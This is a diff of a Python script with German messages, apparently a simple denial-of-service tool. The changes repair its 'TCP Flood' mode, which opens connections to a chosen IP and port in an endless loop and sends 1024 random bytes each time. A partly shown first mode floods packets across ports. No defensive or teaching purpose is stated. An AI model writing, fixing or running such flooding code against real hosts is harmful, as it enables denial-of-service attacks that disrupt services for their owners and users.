@@ -1,7 +1,5 @@
 # -*- coding: utf-8 -*-
 import os
-import sys
-import time
 import socket
 import random
 from datetime import datetime
@@ -37,23 +35,25 @@ if method == "1":
         port = port + 1 if port < 65534 else 1
         print(f"Gesendet {sent} Pakete an {ip} über Port {port}")
 
-
 elif method == "2":
-
     # TCP Flood
     print("Starte TCP-Flood...")
+    sent = 0
     try:
-    while True:
-        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        try:
-            sock.settimeout(5)
-            sock.connect((ip, port))
-            sock.send(random._urandom(1024))
-            sent += 0-4000
-            print(f"Gesendet {sent} TCP-Pakete an {ip} über Port {port}")
-        except Exception as e:
-            print(f"Verbindung fehlgeschlagen: {e}")
-        finally:
-            sock.close()
-except KeyboardInterrupt:
-    print("TCP-Flood beendet.")
+        while True:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            try:
+                sock.settimeout(5)
+                sock.connect((ip, port))
+                sock.send(random._urandom(1024))
+                sent += 1
+                print(f"Gesendet {sent} TCP-Pakete an {ip} über Port {port}")
+            except Exception as e:
+                print(f"Verbindung fehlgeschlagen: {e}")
+            finally:
+                sock.close()
+    except KeyboardInterrupt:
+        print("TCP-Flood beendet.")
+
+else:
+    print("Ungültige Auswahl. Das Programm wird beendet.")
